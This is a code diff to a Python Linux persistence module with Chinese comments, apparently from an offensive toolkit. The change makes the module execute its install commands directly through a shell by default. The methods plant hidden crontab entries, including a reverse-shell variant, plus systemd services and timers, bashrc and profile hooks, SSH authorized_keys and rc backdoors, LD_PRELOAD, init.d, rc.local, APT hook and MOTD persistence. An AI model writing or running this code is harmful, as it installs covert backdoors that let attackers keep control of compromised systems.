@@ -44,34 +44,70 @@ class PersistenceResult:
     cleanup_command: str = ""
     content: str = ""
     error: str = ""
+    executed: bool = False
+    execution_output: str = ""
 
 
 class LinuxPersistence:
     """
-    Linux 持久化生成器
+    Linux 持久化引擎
 
     Usage:
-        persistence = LinuxPersistence()
+        persistence = LinuxPersistence(execute=True)  # 直接执行安装
 
-        # Crontab 持久化
+        # Crontab 持久化 — 直接安装到系统
         result = persistence.crontab(
             command="/tmp/payload.sh",
             schedule="*/5 * * * *"
         )
+        # result.executed == True, result.success == True
 
-        # Systemd 服务持久化
-        result = persistence.systemd_service(
-            name="system-health",
-            exec_path="/opt/.hidden/payload"
-        )
+        # 仅生成命令 (不执行)
+        persistence = LinuxPersistence(execute=False)
+        result = persistence.crontab(...)
+        print(result.install_command)  # 手动执行
     """
 
-    def __init__(self):
+    def __init__(self, execute: bool = True):
+        """
+        Args:
+            execute: True=直接执行安装命令, False=仅生成命令
+        """
+        self._execute = execute
         self._random_suffix = "".join(secrets.choice(string.ascii_lowercase) for _ in range(4))
 
     def _generate_name(self, prefix: str = "sys") -> str:
         """生成随机名称"""
         return f"{prefix}-{self._random_suffix}"
+
+    def _execute_install(self, result: PersistenceResult) -> PersistenceResult:
+        """如果 execute=True，执行安装命令并更新结果"""
+        if not self._execute or not result.install_command:
+            return result
+        try:
+            import subprocess
+
+            proc = subprocess.run(
+                result.install_command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=30,
+            )
+            result.executed = True
+            result.execution_output = proc.stdout[:1000] + proc.stderr[:1000]
+            if proc.returncode != 0:
+                result.success = False
+                result.error = f"安装命令执行失败 (exit {proc.returncode}): {proc.stderr[:500]}"
+                logger.error("持久化安装失败 [%s]: %s", result.method, result.error)
+            else:
+                logger.info("持久化安装成功 [%s]: %s", result.method, result.location)
+        except subprocess.TimeoutExpired:
+            result.executed = True
+            result.error = "安装命令执行超时"
+        except Exception as e:
+            result.error = f"安装命令执行异常: {e}"
+        return result
 
     # ==================== Crontab ====================
 
@@ -99,7 +135,7 @@ class LinuxPersistence:
             install_cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
             cleanup_cmd = f'crontab -l | grep -v "{command}" | crontab -'
 
-        return PersistenceResult(
+        result = PersistenceResult(
             success=True,
             method=LinuxPersistMethod.CRONTAB.value,
             location=f"/var/spool/cron/crontabs/{user or '$USER'}",
@@ -107,6 +143,7 @@ class LinuxPersistence:
             cleanup_command=cleanup_cmd,
             content=cron_entry,
         )
+        return self._execute_install(result)
 
     def crontab_reverse_shell(
         self, lhost: str, lport: int, schedule: str = "*/5 * * * *"
@@ -173,14 +210,14 @@ systemctl disable {name}
 rm -f {service_file}
 systemctl daemon-reload"""
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.SYSTEMD_SERVICE.value,
             location=service_file,
             install_command=install_cmd,
             cleanup_command=cleanup_cmd,
             content=service_content,
-        )
+        ))
 
     def systemd_timer(
         self, exec_path: str, name: str = "", on_boot_sec: int = 60, on_unit_active_sec: int = 300
@@ -256,14 +293,14 @@ WantedBy=timers.target
         escaped_cmd = command.replace("/", r"\/")
         cleanup_cmd = f'sed -i "/{escaped_cmd}/d" {bashrc_path}'
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.BASHRC.value,
             location=bashrc_path,
             install_command=install_cmd,
             cleanup_command=cleanup_cmd,
             content=entry,
-        )
+        ))
 
     def profile(self, command: str, hidden: bool = True) -> PersistenceResult:
         """
@@ -276,14 +313,14 @@ WantedBy=timers.target
         else:
             entry = f"\n{command}\n"
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.PROFILE.value,
             location=profile_path,
             install_command=f'echo "{entry}" >> {profile_path}',
             cleanup_command='sed -i "/{}/d" {}'.format(command.replace("/", r"\/"), profile_path),
             content=entry,
-        )
+        ))
 
     # ==================== SSH ====================
 
@@ -313,7 +350,7 @@ chmod 700 $(dirname {auth_keys_path})
 echo "{entry}" >> {auth_keys_path}
 chmod 600 {auth_keys_path}"""
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.SSH_AUTHORIZED_KEYS.value,
             location=auth_keys_path,
@@ -322,7 +359,7 @@ chmod 600 {auth_keys_path}"""
                 public_key[:30].replace("/", r"\/"), auth_keys_path
             ),
             content=entry,
-        )
+        ))
 
     def ssh_authorized_keys_backdoor(
         self, public_key: str, backdoor_command: str, user: str = "root"
@@ -357,14 +394,14 @@ chmod 600 {auth_keys_path}"""
 EOF
 chmod 700 {rc_path}"""
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.SSH_RC.value,
             location=rc_path,
             install_command=install_cmd,
             cleanup_command=f"rm -f {rc_path}",
             content=content,
-        )
+        ))
 
     # ==================== LD_PRELOAD ====================
 
@@ -386,13 +423,13 @@ chmod 700 {rc_path}"""
             install_cmd = f'echo "LD_PRELOAD={so_path}" >> {location}'
             cleanup_cmd = f'sed -i "/LD_PRELOAD/d" {location}'
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.LD_PRELOAD.value,
             location=location,
             install_command=install_cmd,
             cleanup_command=cleanup_cmd,
-        )
+        ))
 
     def generate_preload_so(self, command: str) -> str:
         """
@@ -457,14 +494,14 @@ INITEOF
 chmod +x {init_path}
 update-rc.d {name} defaults"""
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.INIT_D.value,
             location=init_path,
             install_command=install_cmd,
             cleanup_command=f"update-rc.d -f {name} remove && rm -f {init_path}",
             content=script_content,
-        )
+        ))
 
     def rc_local(self, command: str) -> PersistenceResult:
         """
@@ -480,13 +517,13 @@ sed -i '/^exit 0/d' {rc_local_path}
 echo '{command}' >> {rc_local_path}
 echo 'exit 0' >> {rc_local_path}"""
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.RC_LOCAL.value,
             location=rc_local_path,
             install_command=install_cmd,
             cleanup_command='sed -i "/{}/d" {}'.format(command.replace("/", r"\/"), rc_local_path),
-        )
+        ))
 
     # ==================== APT Hook ====================
 
@@ -499,14 +536,14 @@ echo 'exit 0' >> {rc_local_path}"""
 
         content = f'APT::Update::Pre-Invoke {{"{command}";}};'
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.APT_HOOK.value,
             location=hook_path,
             install_command=f"echo '{content}' > {hook_path}",
             cleanup_command=f"rm -f {hook_path}",
             content=content,
-        )
+        ))
 
     # ==================== MOTD ====================
 
@@ -520,7 +557,7 @@ echo 'exit 0' >> {rc_local_path}"""
 {command} >/dev/null 2>&1 &
 """
 
-        return PersistenceResult(
+        return self._execute_install(PersistenceResult(
             success=True,
             method=LinuxPersistMethod.MOTD.value,
             location=motd_path,
@@ -530,7 +567,7 @@ EOF
 chmod +x {motd_path}""",
             cleanup_command=f"rm -f {motd_path}",
             content=content,
-        )
+        ))
 
     # ==================== 综合方法 ====================
 
